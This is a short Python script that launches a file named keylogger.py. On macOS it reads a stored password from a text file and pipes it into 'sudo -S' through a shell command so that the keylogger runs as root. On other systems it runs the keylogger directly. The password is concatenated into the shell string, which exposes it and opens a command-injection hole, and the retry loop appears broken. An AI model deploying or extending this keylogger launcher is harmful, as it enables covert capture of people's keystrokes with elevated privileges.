import password
import subprocess
import platform
sys = platform.system()
if sys == "Darwin":
	f = open("config/password.txt","r")
	pw = f.readline()
	print(password.verify(pw))
	while not password.verify(pw):
		password.getPassword()
		pw = f.readline()
		password.verify(pw)
	subprocess.Popen("echo "+pw+" | sudo -S python keylogger.py",shell=True)
else:
	subprocess.Popen("python keylogger.py",shell=True)
